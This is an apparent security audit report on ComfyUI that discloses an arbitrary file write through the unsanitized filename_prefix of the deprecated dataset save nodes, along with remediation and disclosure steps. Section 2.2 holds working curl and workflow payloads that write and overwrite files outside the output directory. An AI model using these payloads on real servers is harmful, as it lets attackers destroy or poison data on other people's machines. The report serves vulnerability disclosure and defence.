# Security Audit Report — ComfyUI

| | |
|---|---|
| **Target** | ComfyUI (`comfyanonymous/ComfyUI`) |
| **Version tested** | v0.37.0 — master @ `b33e2b55cae074eca5aec96283cceac19aa249ba` (2026-09-22) |
| **Audit date** | 2026-09-22 |
| **Environment** | Linux x86_64, Python 3.11, CPU build, dependencies per `requirements.txt` |
| **Method** | Manual source review of the attack surface + dynamic verification against a live server |
| **Result** | **1 in-scope verified vulnerability** (arbitrary file write), 1 informational hardening note, 15+ components audited clean |

---

## 1. Executive summary

ComfyUI's HTTP/file-handling surface (`/view`, `/upload/image`, `/upload/mask`, `/userdata/*`, the asset manager, model preview, and user data endpoints) is **well hardened**: nearly every path-join is followed by a canonicalized containment check (`commonpath` after `abspath`, or `realpath`-based `is_within_directory`). The legacy path-traversal CVEs in those endpoints appear fixed and their bypasses (URL double-decoding, backslashes, absolute paths, symlink escapes) were specifically tested and do not work.

However, one place was missed: the **deprecated dataset "save to folder" nodes** in `comfy_extras/nodes_dataset.py`. In `overwrite` mode, the user-controlled `filename_prefix` is concatenated into the final path with **no sanitization and no containment check**. This allows:

- writing files at **absolute paths** anywhere on the filesystem, and
- **relative `../` traversal** out of the output directory,

with **no authentication, no models, and no GPU required**. One variant (`SaveImageTextDataSetToFolder`) additionally writes **fully attacker-controlled text content** and can **silently overwrite existing files**.

Both nodes are **built in and registered by default**, so the issue is reachable by an unauthenticated HTTP client **and by a crafted workflow file** — the exact vector ComfyUI's own `SECURITY.md` defines as in scope: *"a workflow file that such a user might plausibly load and run, using only built-in nodes, that results in … arbitrary file read/write outside expected directories"*.

**All findings below were reproduced end-to-end against a live ComfyUI 0.37.0 server (not just static analysis).**

---

## 2. Finding 1 (in-scope, verified): Path traversal / absolute-path injection in `SaveImageDataSetToFolder[Text]` → arbitrary file write (CWE-22, CWE-73)

### 2.1 Root cause

`comfy_extras/nodes_dataset.py` — `save_images_to_folder()`:

```python
def save_images_to_folder(image_list, output_dir, prefix="image", overwrite=True):
    os.makedirs(output_dir, exist_ok=True)
    saved_files = []
    for idx, img_tensor in enumerate(image_list):
        ...
        if overwrite:
            filename = f"{prefix}_{idx:05d}.png"                 # <-- UNSANITIZED
        else:
            _, _, counter, _, resolved_prefix = folder_paths.get_save_image_path(prefix, output_dir)  # safe branch
            filename = f"{resolved_prefix}_{counter:05}_{idx:05d}.png"
        filepath = os.path.join(output_dir, filename)            # <-- no containment check
        img.save(filepath)
```

Callers (only two — both deprecated V3 nodes, both still registered and executed by default):

1. **L491** — `SaveImageDataSetToFolderNode.execute()` → writes attacker-influenced PNG content.
2. **L545** — `SaveImageTextDataSetToFolderNode.execute()` → writes a **`.txt` caption with fully caller-controlled content** (`caption_path = os.path.join(output_dir, caption_filename)`, same flaw, same filename base).

Per-caller, `folder_name` **is** traversal-safe (`secure_subfolder_path()` uses `realpath`-based `is_within_directory`), and `increment` mode is safe (`get_save_image_path()` contains its own `is_within_directory` check). The maintainers clearly hardened this file for traversal — **the overwrite-mode `filename_prefix` was simply overlooked.** That asymmetry is itself strong evidence this is an unintended bug, not a design decision.

Note `is_deprecated=True` on both schemas is a **UI hint only** — nothing in `execution.validate_prompt()` (server-side) rejects deprecated nodes:

```python
class_ = nodes.NODE_CLASS_MAPPINGS.get(class_type, None)   # only existence is checked
```

### 2.2 Verification (executed, not theoretical)

Live server: `python main.py --cpu --listen 0.0.0.0 --port 8188`.

**A. Absolute-path write (CWE-73):**

```bash
curl -X POST http://127.0.0.1:8188/prompt -H 'Content-Type: application/json' -d '{
 "prompt": {
  "1": {"class_type": "EmptyImage", "inputs": {"width": 16, "height": 16, "color": 16711680, "batch_size": 1}},
  "2": {"class_type": "SaveImageDataSetToFolder", "inputs": {
      "images": ["1", 0], "folder_name": "dataset",
      "filename_prefix": "/tmp/comfyui_pwn/arena_owned_abs", "mode": "overwrite"}}
 }}'
# → {"prompt_id": "e7e9d71f-…", "number": 0, "node_errors": {}}
# → created: /tmp/comfyui_pwn/arena_owned_abs_00000.png
```

**B. `../` traversal write (CWE-22):**

```bash
"filename_prefix": "../../../../../../../../tmp/comfyui_pwn/arena_owned_traversal"
# → created: /tmp/comfyui_pwn/arena_owned_traversal_00000.png
```

**C. Controlled-content write:**

```bash
"2": {"class_type": "SaveImageTextDataSetToFolder", "inputs": {
    "images": ["1", 0], "texts": "PWNED-BY-UNAUTH-REMOTE-CALLER arbitrary content",
    "folder_name": "dataset", "filename_prefix": "/tmp/comfyui_pwn/owned_content", "mode": "overwrite"}}
# → /tmp/comfyui_pwn/owned_content_00000.txt contains exactly the attacker string
```

**D. Silent overwrite of an existing file:** pre-created `important_config_00000.txt` with "ORIGINAL - top secret configuration" → after one request contains only `WIPED BY ATTACKER`. `overwrite` mode truncates existing files without notice.

`EmptyImage` provides the required image input with **no models and no GPU**, so the exploit works on a stock install.

### 2.3 Impact

- **Preconditions:** ComfyUI's default configuration has **no authentication** — anyone who can reach `/prompt` (HTTP) can trigger this; alternatively a victim imports a crafted workflow `.json` (the in-scope vector per `SECURITY.md`; workflows are routinely shared on Discord/forums/model galleries, and execution is silent/immediate).
- **Effect:** create or truncate files **anywhere the ComfyUI process can write**:
  - files named `*_NNNNN.png` (attacker-influenced pixel content), or
  - files named `*_NNNNN.txt` with **fully attacker-controlled content**.
- The forced `_NNNNN.png` / `_NNNNN.txt` suffix and the requirement that the parent directory already exists limit direct RCE, but this remains a serious integrity primitive:
  - Destroy/poison arbitrary user data (documents, projects, configs) anywhere on disk — on cloud/container deployments (RunPod, Vast.ai, official Docker patterns) ComfyUI frequently runs as **root**.
  - Overwrite attack-pattern-matching files that already exist.
  - Written content is process-privileged; planted payloads can be activated by a second step (another node/operation), turning this into an escalation building block.
- **Suggested severity:** Medium–High. As an API issue: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` ≈ **7.5**; under the workflow-file delivery model (UI required): ≈ 5.5–6.5 Medium. Final scoring is the triager's call.

### 2.4 Remediation

Sanitize/check the final path inside `save_images_to_folder()`, covering both callers (see `fix_suggestion.diff`):

```python
filepath = os.path.join(output_dir, filename)
if not folder_paths.is_within_directory(output_dir, filepath):
    raise ValueError(f"Invalid filename_prefix {prefix!r}: resolves outside of {output_dir}")
```

(or route the overwrite branch through `get_save_image_path()` like the increment branch). Consider also, defence-in-depth: refusing `os.sep`-containing prefixes in these two nodes, and making the server refuse to execute nodes marked `is_deprecated=True` unless explicitly enabled.

---

## 3. Finding 2 (informational — out of scope per ComfyUI policy): cross-origin workflow execution against non-loopback listeners (CWE-352)

`server.py:create_origin_only_middleware()` enforces `Host == Origin` **only when the `Host` resolves to loopback**. When ComfyUI is launched with `--listen 0.0.0.0` (default in most container/cloud deployments), a victim's browser can be driven by **any malicious web page** to POST to the instance: "simple" requests (`Content-Type: text/plain`, no preflight needed) are accepted because aiohttp's `request.json()` ignores the content type. Verified: a cross-origin `text/plain` POST to `/prompt` queued and executed the Finding-1 workflow (file `csrf_driven_00000.png` created). On loopback hosts the same request is correctly rejected (403).

Write operations are reachable (read exfiltration is still blocked by SOP since no CORS headers are sent). ComfyUI's `SECURITY.md` explicitly classifies anything requiring `--listen` as **not a vulnerability** ("These are bugs, not vulnerabilities"), so this is listed as hardening guidance only: enforce the Origin↔Host match whenever an `Origin` header is present (not only for loopback), or gate mutating endpoints behind a random per-session token. Worth a regular GitHub issue, not a security report.

---

## 4. Areas audited — no issues found (defenses verified)

| Area | Defense verified |
|---|---|
| `GET /view` (+`subfolder`, `[input/output/temp]` annotations) | `..` and absolute paths rejected; `basename`; `commonpath` containment; dangerous content-types forced to `attachment` + `nosniff` with `Vary: Sec-Fetch-Dest` |
| `POST /upload/image` & `/upload/mask` | `commonpath((upload_dir, abspath(filepath)))` check; `original_ref` `..`/leading-slash rejection; subfolder `commonpath` |
| `/api/userdata*` (`/userdata`, v1, v2, move, delete, settings) | server-generated user IDs; `commonpath` after `abspath`; `%`-double-decode safe (check after full decode); uploads via `mkstemp`+`os.replace`; dangerous types forced to attachment |
| Asset manager (`/api/assets/*`) | `--enable-assets` is **opt-in (off by default)**; destination derived strictly via `resolve_destination_from_tags()` (fixed roots, `[]` subdirs) + `validate_path_within_base()`; filenames are `<blake3>.<ext>`; `Content-Disposition` uses `filename*` quoting; bash sources fully parametrized SQLAlchemy |
| `/experiment/models/preview/{folder}/{path_index}/{filename:*}` | `normpath` + `is_within_directory` on the file **and re-validation of the glob-selected preview** (symlink escape considered) |
| `/view_metadata/{folder_name}`, `/models/{folder}` | folder allow-list against `folder_names_and_paths` |
| `/internal/*` routes | directories restricted to output/input/temp; no path params |
| `folder_paths.get_full_path()` | traversal-neutralizing via `os.path.relpath(os.path.join("/", filename), "/")` |
| `nodes_dataset.py` other nodes (`MakeTrainingDataset`, `LoadTrainingDataset`, folder pickers) | all use `secure_subfolder_path()` (realpath containment) |
| Save-image/model nodes (`SaveImage`, `CheckpointSave`, `LoraSave`, `SaveText`, audio/latent/video savers, 3D saver) | all go through `get_save_image_path()` → `is_within_directory` |
| `nodes_math.py` (`ComfyMathExpression`) | uses vetted `simpleeval.simple_eval`, names/functions allow-lists |
| Frontend download (`init_frontend_unsafe`) | owner/repo/version strictly regex-validated; `ZipFile.extractall` is py3-sanitized; CLI-controlled only |
| WebSocket `/ws` | origin middleware covers the handshake; state-changing ops go through HTTP anyway |
| `main.py`/`cli_args.py` | binds `127.0.0.1` by default; `--listen` requires explicit opt-in |
| `GET /` static serving | `web.static()` default `follow_symlinks=False` (unaffected by CVE-2024-23334) |

Also reviewed and rejected as out-of-mode: CSRF on loopback installs (blocked, verified 403), multi-user `comfy-user` header trust (documented design), `torch.load` of user-placed pickles (upstream/local-placement required).

---

## 5. Deliverables

- `SECURITY_AUDIT_COMFYUI.md` — this report
- `poc_arbitrary_file_write.py` — parameterized PoC (dry-run by default; `--execute` required)
- `malicious_workflow_demo.json` — demo workflow-file vector (benign `$HOME/comfy_pwn_demo` target)
- `fix_suggestion.diff` — proposed patch for upstream

## 6. Responsible disclosure checklist

1. Report privately: https://github.com/comfyanonymous/ComfyUI/security/advisories/new (preferred by `SECURITY.md`) and/or the Huntr ComfyUI program.
2. Include: this finding, exact reproduction (Section 2.2), version/commit, OS/install method, and the workflow-file impact rationale (they require it).
3. Do **not** publish the PoC until the fix ships and a CVE ID is assigned.
4. Expected CVE class if accepted: CWE-22/CWE-73 (arbitrary file write). Prior ComfyUI CVEs on Huntr accepted similar classes.

---

*Audit performed as an educational security research exercise against a local, self-hosted instance only.*
